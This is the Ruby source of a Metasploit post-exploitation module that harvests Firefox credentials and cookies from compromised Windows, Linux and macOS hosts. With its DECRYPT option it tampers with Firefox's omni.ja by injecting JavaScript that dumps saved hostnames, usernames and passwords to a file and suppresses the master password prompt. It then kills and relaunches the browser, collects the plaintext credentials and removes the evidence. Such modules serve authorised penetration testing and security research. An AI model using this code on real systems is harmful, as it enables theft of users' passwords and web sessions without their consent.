##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# Standard Library
#
require 'tmpdir'

#
# Gems
#
require 'zip'

#
# Project
#
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Multi Gather Firefox Signon Credential Collection',
      'Description'    => %q{
          This module will collect credentials from the Firefox web browser if it is
        installed on the targeted machine. Additionally, cookies are downloaded. Which
        could potentially yield valid web sessions.

        Firefox stores passwords within the signons.sqlite database file. There is also a
        keys3.db file which contains the key for decrypting these passwords. In cases where
        a Master Password has not been set, the passwords can easily be decrypted using
        3rd party tools or by setting the DECRYPT option to true. Using the latter often
        needs root privileges. Also be warned that if your session dies in the middle of the
        file renaming process, this could leave Firefox in a non working state. If a
        Master Password was used the only option would be to bruteforce.

        Useful 3rd party tools:
        + firefox_decrypt (https://github.com/Unode/firefox_decrypt)
        + pswRecovery4Moz (https://github.com/philsmd/pswRecovery4Moz)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bannedit',
          'xard4s', # added decryption support
          'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features
        ],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['meterpreter', 'shell' ]
    ))

    register_options([
      OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
    ])

    register_advanced_options([
      OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),
      OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),
      OptBool.new('RECOVER',  [false, 'Attempt to recover from bad DECRYPT when possible', false])
    ])
  end


  def run
    # Certain shells for certain platform
    vprint_status("Determining session platform and type")
    case session.platform
    when 'unix', 'linux', 'bsd'
      @platform = :unix
    when 'osx'
      @platform = :osx
    when 'windows'
      if session.type != "meterpreter"
        print_error "Only meterpreter sessions are supported on Windows hosts"
        return
      end
      @platform = :windows
    else
      print_error("Unsupported platform: #{session.platform}")
      return
    end

    if datastore['DECRYPT']
      do_decrypt
    else  # Non DECRYPT
      paths = []
      paths = enum_users

      if paths.nil? or paths.empty?
        print_error("No users found with a Firefox directory")
        return
      end

      download_loot(paths.flatten)
    end
  end

  def do_decrypt
    unless datastore['DISCLAIMER']
      decrypt_disclaimer
      return
    end

    omnija = nil             # non meterpreter download
    org_file = 'omni.ja'     # key file
    new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"
    temp_file = "orgomni.ja" # backup of key file

    # Sets @paths
    return unless decrypt_get_env

    # Check target for the necessary files
    if session.type == "meterpreter"
      if session.fs.file.exist?(@paths['ff'] + temp_file) && !session.fs.file.exist?(@paths['ff'] + org_file)
        print_error("Detected #{temp_file} without #{org_file}. This is a good sign of previous DECRYPT attack gone wrong.")
        return
      elsif session.fs.file.exist?(@paths['ff'] + temp_file)
        decrypt_file_stats(temp_file, org_file, @paths['ff'])
        if datastore['RECOVER']
          return unless decrypt_recover_omni(temp_file, org_file)
        else
          print_warning("If you wish to continue by trying to recover, set the advanced option, RECOVER, to TRUE.")
          return
        end
      elsif !session.fs.file.exist?(@paths['ff'] + org_file)
        print_error("Could not download #{org_file}. File does not exist.")
        return
      end
    end # session.type == "meterpreter"

    session.type == "meterpreter" ? (size = "(%s MB)" % "%0.2f" % (session.fs.file.stat(@paths['ff'] + org_file).size / 1048576.0)) : (size = "")
    tmp = Dir::tmpdir + "/" + new_file          # Cross platform local tempdir, "/" should work on Windows too
    print_status("Downloading #{@paths['ff'] + org_file} to: #{tmp} %s" % size)

    if session.type == "meterpreter"            # If meterpreter is an option, lets use it!
      session.fs.file.download_file(tmp, @paths['ff'] + org_file)
    else                                        # Fall back shells
      omnija = read_file(@paths['ff'] + org_file)
      if omnija.nil? or omnija.empty? or omnija =~ /No such file/i
        print_error("Could not download: #{@paths['ff'] + org_file}")
        print_error("Tip: Try switching to a meterpreter shell if possible (as it's more reliable/stable when downloading)") if session.type != "meterpreter"
        return
      end

      print_status("Saving #{org_file} to: #{tmp}")
      file_local_write(tmp, omnija)
    end

    res = nil
    print_status("Injecting into: #{tmp}")
    begin
      # Automatically commits the changes made to the zip archive when the block terminates
      Zip::File.open(tmp) do |zip_file|
        res = decrypt_modify_omnija(zip_file)
      end
    rescue Zip::Error => e
      print_error("Error modifying: #{tmp}")
      return
    end

    if res
      vprint_good("Successfully modified: #{tmp}")
    else
      print_error("Failed to inject")
      return
    end

    print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
    print_warning("This may take some time...") if [:unix, :osx].include?(@platform)

    if session.type == "meterpreter"
      session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
    else
      unless upload_file(@paths['ff'] + new_file, tmp)
        print_error("Could not upload: #{tmp}")
        return
      end
    end

    return unless decrypt_trigger_decrypt(org_file, new_file, temp_file)

    decrypt_download_creds
  end

  def decrypt_disclaimer
    print_line
    print_warning("Decrypting the keys causes the remote Firefox process to be killed.")
    print_warning("If the user is paying attention, this could make them suspicious.")
    print_warning("In order to proceed, set the advanced option, DISCLAIMER, to TRUE.")
    print_line
  end


  def decrypt_file_stats(temp_file, org_file, path)
    print_line
    print_error("Detected #{temp_file} already on the target. This could possible a possible backup of the original #{org_file} from a bad DECRYPT attack.")
    print_status("Size: #{session.fs.file.stat(@paths['ff'] + org_file).size}B (#{org_file})")
    print_status("Size: #{session.fs.file.stat(@paths['ff'] + temp_file).size}B (#{temp_file})")
    print_status("#{org_file}   : Created- #{session.fs.file.stat(@paths['ff'] + org_file).ctime}  Modified- #{session.fs.file.stat(@paths['ff'] + org_file).mtime}  Accessed- #{session.fs.file.stat(@paths['ff'] + org_file).mtime}")
    print_status("#{temp_file}: Created- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}  Modified- #{session.fs.file.stat(@paths['ff'] + temp_file).mtime}  Accessed- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}")
    print_line
  end


  def decrypt_recover_omni(temp_file, org_file)
    print_status("Restoring: #{@paths['ff'] + temp_file} (Possible backup)")
    file_rm(@paths['ff'] + org_file)
    rename_file(@paths['ff'] + temp_file, @paths['ff'] + org_file)

    if session.type == "meterpreter"
      print_error("There is still #{temp_file} on the target. Something went wrong.") if session.fs.file.exist?(@paths['ff'] + temp_file)

      unless session.fs.file.exist?(@paths['ff'] + org_file)
        print_error("#{org_file} is no longer at #{@paths['ff'] + org_file}")
        return false
      end
    end # session.type == "meterpreter"

    true
  end


  def enum_users
    paths = []
    id = whoami

    if id.nil? or id.empty?
      print_error("Session #{datastore['SESSION']} is not responding")
      return
    end

    if @platform == :windows
      vprint_status("Searching every possible account on the target system")
      grab_user_profiles().each do |user|
        next if user['AppData'].nil?
        dir = check_firefox_win(user['AppData'])
        paths << dir if dir
      end
    else   # unix, bsd, linux, osx
      @platform == :osx ? (home = "/Users/") : (home = "/home/")

      if got_root
        vprint_status("Detected ROOT privileges. Searching every account on the target system.")
        userdirs = "/root\n"
        userdirs << cmd_exec("find #{home} -maxdepth 1 -mindepth 1 -type d 2>/dev/null")
      else
        vprint_status("Checking #{id}'s Firefox account")
        userdirs = "#{home + id}\n"
      end

      userdirs.each_line do |dir|
        dir.chomp!
        next if dir == "." or dir == ".." or dir =~ /No such file/i

        @platform == :osx ? (basepath = "#{dir}/Library/Application Support/Firefox/Profiles") : (basepath = "#{dir}/.mozilla/firefox")

        print_status("Checking for Firefox profile in: #{basepath}")
        checkpath = cmd_exec("find " + basepath.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type d 2>/dev/null")

        checkpath.each_line do |ffpath|
          ffpath.chomp!
          if ffpath =~ /\.default$/
            vprint_good("Found profile: #{ffpath}")
            paths << "#{ffpath}"
          end
        end
      end
    end
    return paths
  end

  def check_firefox_win(path)
    paths  = []
    ffpath = []
    path   = path + "\\Mozilla\\"
    print_status("Checking for Firefox profile in: #{path}")

    stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
    if !stat
      print_error("Firefox was not found (Missing profiles.ini)")
      return
    end

    session.fs.dir.foreach(path) do |fdir|
      #print_status("Found a Firefox directory: #{path + fdir}")
      ffpath << path + fdir
      break
    end

    if ffpath.empty?
      print_error("Firefox was not found")
      return
    end

    #print_status("Locating Firefox profiles")
    path << "Firefox\\Profiles\\"

    # We should only have profiles in the Profiles directory store them all
    begin
      session.fs.dir.foreach(path) do |pdirs|
        next if pdirs == "." or pdirs == ".."
        vprint_good("Found profile: #{path + pdirs}")
        paths << path + pdirs
      end
    rescue
      print_error("Profiles directory is missing")
      return
    end

    paths.empty? ? (nil) : (paths)
  end


  def download_loot(paths)
    loot = ""
    print_line

    paths.each do |path|
      print_status("Profile: #{path}")

      #   win: C:\Users\administrator\AppData\Roaming\Mozilla\Firefox\Profiles\tsnwjx4g.default
      # linux: /root/.mozilla/firefox/tsnwjx4g.default         (iceweasel)
      #   osx: /Users/mbp/Library/Application Support/Firefox/Profiles/tsnwjx4g.default
      profile = path.scan(/Profiles[\\|\/](.+)\.(.+)$/).flatten[0].to_s
      profile = path.scan(/firefox[\\|\/](.+)\.(.+)$/).flatten[0].to_s if profile.empty?

      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("find "+ path.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type f 2>/dev/null").gsub(/.*\//, "").split("\n"))

      files.each do |file|
        file.chomp!
        if file =~ /^key\d\.db$/ or file =~ /^cert\d\.db$/ or file =~ /^signons.sqlite$/i or file =~ /^cookies\.sqlite$/ or file =~ /^logins\.json$/
          ext = file.split('.')[2]
          ext == "txt" ? (mime = "plain") : (mime = "binary")
          vprint_status("Downloading: #{file}")
          if @platform == :windows
            p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
            session.fs.file.download_file(p, path + "\\" + file)
            print_good("Downloaded #{file}: #{p.to_s}")
          else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
            loot = cmd_exec("cat #{path}//#{file}", nil, datastore['DOWNLOAD_TIMEOUT'])
            if loot.nil? || loot.empty?
              print_error("Failed to download #{file}, if the file is very long, try increasing DOWNLOAD_TIMEOUT")
            else
              p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
              print_good("Downloaded #{file}: #{p.to_s}")
            end
          end
        end
      end
      print_line
    end
  end


  # Checks for needed privileges and if Firefox is installed
  def decrypt_get_env
    @paths = {}
    check_paths = []
    loot_file = Rex::Text::rand_text_alpha(6) + ".txt"

    case @platform
    when :windows
      unless got_root || session.sys.config.sysinfo['OS'] =~ /xp/i
        print_warning("You may need SYSTEM privileges on this platform for the DECRYPT option to work")
      end

      env_vars = session.sys.config.getenvs('TEMP', 'SystemDrive')
      tmpdir = env_vars['TEMP'] + "\\"
      drive = env_vars['SystemDrive']

      # This way allows for more independent use of meterpreter payload (32 and 64 bit) and cleaner code
      check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
      check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
    when :unix
      unless got_root
        print_error("You need ROOT privileges on this platform for DECRYPT option")
        return false
      end
      # Unix matches linux|unix|bsd but BSD is not supported
      if session.platform =~ /bsd/
        print_error("Sorry, BSD is not supported by the DECRYPT option")
        return false
      end

      tmpdir = '/tmp/'

      check_paths << '/usr/lib/firefox/'
      check_paths << '/usr/lib64/firefox/'
      check_paths << '/usr/lib/iceweasel/'
      check_paths << '/usr/lib64/iceweasel/'
    when :osx
      tmpdir = '/tmp/'
      check_paths << '/applications/firefox.app/contents/macos/'
    end

    @paths['ff'] = check_paths.find do |p|
      check = p.sub(/(\\|\/)(mozilla\s)?firefox.*/i, '')
      vprint_status("Checking for Firefox directory in: #{check}")
      if directory?(p.sub(/(\\|\/)$/, ''))
        print_good("Found Firefox directory: #{check}")
        true
      else
        false
      end
    end

    if @paths['ff'].nil?
      print_error("No Firefox directory found")
      return false
    end

    @paths['loot'] = tmpdir + loot_file

    true
  end


  def decrypt_modify_omnija(zip)
    # Which files to extract from ja/zip
    files = [
      'components/storage-mozStorage.js',                        # stor_js
      'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul
      'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul
      'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
    ]

    # Extract files from zip
    arya = files.map do |omnija_file|
      fdata = {}
      begin
        fdata['content'] = zip.read(omnija_file) unless omnija_file =~ /jsloader/
        fdata['outs'] = zip.get_output_stream(omnija_file)
      rescue
        print_error("Was not able to find '#{omnija_file}' in the compressed .JA file")
        print_error("This could be due to a corrupt download or a unsupported Firefox/Iceweasel version")
        return false
      end
      fdata
    end

    # Read contents of array (arya)
    stor_js, pwd_xul, dlog_xul, res_js = arya
    stor_js['outs_res'] = res_js['outs']

    # Insert payload (close after starting up - allowing evil js to run and nothing else)
    wnd_close = "window.close();"
    onload = "Startup(); SignonsStartup(); #{wnd_close}"

    # Patch commonDialog.xul - Get rid of (possible) master password prompt
    dlog_xul['content'].sub!(/commonDialogOnLoad\(\);/, wnd_close)
    dlog_xul['outs'].write(dlog_xul['content'])
    dlog_xul['outs'].close
    vprint_good("[1/2] XUL injected - commonDialog.xul")

    # Patch passwordManager.xul - Close password manager immediately
    pwd_xul['content'].sub!(/Startup\(\); SignonsStartup\(\);/, onload)
    pwd_xul['outs'].write(pwd_xul['content'])
    pwd_xul['outs'].close
    vprint_good("[2/2] XUL injected - passwordManager.xul")

    # Patch ./components/storage-mozStorage.js - returns true or false
    return decrypt_patch_method(stor_js)
  end


  # Patches getAllLogins() methods in ./components/storage-mozStorage.js
  def decrypt_patch_method(stor_js)
    data = ""
    # Imports needed for IO
    imports = %Q|Components.utils.import("resource://gre/modules/NetUtil.jsm");
Components.utils.import("resource://gre/modules/FileUtils.jsm");
Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
|

    # Javascript code to intercept the logins array and write the credentials to a file
    method_epilog = %Q|
        var data = "";
        var path = "#{@paths['loot'].inspect.gsub(/"/, '')}";
        var file = new FileUtils.File(path);

        var outstream = FileUtils.openSafeFileOutputStream(file);
        var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].
          createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
        converter.charset = "UTF-8";

        if (logins.length != 0) {
          for (var i = 0; i < logins.length; i++) {
            data += logins[i].hostname + " :: " + logins[i].username + " :: " + logins[i].password + " ^";
          }
        } else {
          data = "no creds";
        }

        var istream = converter.convertToInputStream(data);
        NetUtil.asyncCopy(istream, outstream);

        return logins;
|

    regex = [
      nil, # dirty hack alert
      [/return\slogins;/, method_epilog],
      [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
    ]

    # Match the last two regular expressions
    i = 2 # ...this is todo with the nil in the above regex array & regex command below
    x = i
    stor_js['content'].each_line do |line|
      # There is no real substitution if the matching regex has no corresponding patch code
      if i != 0 && line.sub!(regex[i][0]) do |match|
        if regex[i][1]
          vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
          regex[i][1]
        end
      end # do |match|
      i -= 1
      end # if i != 0
      data << line
    end

    # Write the same data to both output streams
    stor_js['outs'].write(data)
    stor_js['outs_res'].write(data)
    stor_js['outs'].close
    stor_js['outs_res'].close

    i == 0 ? (true) : (false)
  end


  # Starts a new Firefox process and triggers decryption
  def decrypt_trigger_decrypt(org_file, new_file, temp_file)
    [org_file, new_file, temp_file].each do |f|
      f.insert(0, @paths['ff'])
    end

    # Firefox command line arguments
    args = '-purgecaches -chrome chrome://passwordmgr/content/passwordManager.xul'

    # In case of unix-like platform Firefox needs to start under user context
    case @platform
    when :unix
      # Assuming userdir /home/(x) = user
      print_status("Enumerating users")
      homedirs = cmd_exec("find /home -maxdepth 1 -mindepth 1 -type d 2>/dev/null").gsub(/.*\//, "")
      if homedirs.nil? or homedirs.empty?
        print_error("No normal user found")
        return false
      end
      user = nil
      # Skip home directories which contain a space, as those are likely not usernames...
      homedirs.each_line do |homedir|
        user = homedir.chomp
        break unless user.index(" ")
      end

      # Since we can't access the display environment variable we have to assume the default value
      args.insert(0, "\"#{@paths['ff']}firefox --display=:0 ")
      args << "\""
      cmd = "su #{user} -c"
    when :windows, :osx
      cmd = @paths['ff'] + "firefox"
      # On OSX, run in background
      args << "& sleep 5 && killall firefox" if @platform == :osx
    end

    # Check if Firefox is running and kill it
    if session.type == "meterpreter"
      session.sys.process.each_process do |p|
        if p['name'] =~ /firefox\.exe/
          print_status("Found running Firefox process, attempting to kill.")
          unless session.sys.process.kill(p['pid'])
            print_error("Could not kill Firefox process")
            return false
          end
        end
      end
    else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
      p = cmd_exec("ps", "cax | grep firefox")
      if p =~ /firefox/
        print_status("Found running Firefox process, attempting to kill.")
        term = cmd_exec("killall", "firefox && echo true")
        if term !~ /true/
          print_error("Could not kill Firefox process")
          return false
        end
      end
    end
    sleep(1)

    #
    # Rename-fu:
    #   omni.ja (original) -> orgomni.ja (original_backup)
    #   *random*.ja (evil) -> omni.ja (original)
    #   ...start & close Firefox...
    #   omni.ja (evil)               -> *random*.ja (pointless temp file)
    #   orgomni.ja (original_backup) -> omni.ja (original)
    #
    vprint_status("Renaming .JA files")
    rename_file(org_file, temp_file)
    rename_file(new_file, org_file)

    # Automatic termination (window.close() - injected XUL or firefox cmd arguments)
    print_status("Starting Firefox process to get #{whoami}'s credentials")
    cmd_exec(cmd, args)
    sleep(1)

    # Lets just check theres something before going forward
    if session.type == "meterpreter"
      i=20
      vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") unless session.fs.file.exist?(@paths['loot'])
      while (!session.fs.file.exist?(@paths['loot']))
        sleep 1
        i -= 1
        break if i == 0
      end
      print_error("Missing loot file. Something went wrong.") unless session.fs.file.exist?(@paths['loot'])
    end # session.type == "meterpreter"

    print_status("Restoring original .JA: #{temp_file}")
    rename_file(org_file, new_file)
    rename_file(temp_file, org_file)

    # Clean up
    vprint_status("Cleaning up: #{new_file}")
    file_rm(new_file)
    if session.type == "meterpreter"
      if session.fs.file.exist?(temp_file)
        print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
      end
      unless session.fs.file.exist?(org_file)
        print_error("Unable to find #{org_file} on target. Something went wrong.")
      end
    end # session.type == "meterpreter"

    # At this time, there should have a loot file
    if session.type == "meterpreter"
      unless session.fs.file.exist?(@paths['loot'])
        print_error("DECRYPT failed. Either something went wrong (download/upload? Injecting?), there is a master password or an unsupported Firefox version.")
        # Another issue is encoding. The files may be seen as 'data' rather than 'ascii'
        print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading/uploading)") if session.type != "meterpreter"
        return false
      end
    end

    true
  end


  def decrypt_download_creds
    print_good("Downloading loot: #{@paths['loot']}")
    loot = read_file(@paths['loot'])

    if loot =~ /no creds/
      print_status("No Firefox credentials where found")
      return
    end

    # Better delete the remote creds file
    vprint_status("Cleaning up: #{@paths['loot']}")
    file_rm(@paths['loot'])

    # Create table to store
    cred_table = Rex::Text::Table.new(
      'Header' => 'Firefox Credentials',
      'Indent' => 1,
      'Columns'=>
        [
          'Hostname',
          'User',
          'Password'
        ]
    )

    creds = loot.split("^")
    creds.each do |cred|
      hostname, user, pass = cred.rstrip.split(" :: ")
      cred_table << [hostname, user, pass]

      # Creds API
      service_data = {
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        smodule_fullname: self.fullname,
        username: user,
        private_data: pass,
        private_type: :password
      }.merge(service_data)

      create_credential(credential_data)
    end

    # Create local loot csv file
    path = store_loot(
      "firefox.creds",
      "text/plain",
      session,
      cred_table.to_csv,
      "firefox_credentials.txt",
      "Firefox Credentials")
    vprint_good("Saved loot: #{path.to_s}")

    # Display out
    vprint_line("\n" + cred_table.to_s)
  end


  def got_root
    case @platform
    when :windows
      session.sys.config.getuid =~ /SYSTEM/ ? true : false
    else   # unix, bsd, linux, osx
      id_output = cmd_exec("id").chomp
      if id_output.blank?
        # try an absolute path
        id_output = cmd_exec("/usr/bin/id").chomp
      end
      id_output.include?("uid=0(") ? true : false
    end
  end


  def whoami
    if @platform == :windows
      id = session.sys.config.getenv('USERNAME')
    else
      id = cmd_exec("id -un")
    end

    id
  end
end
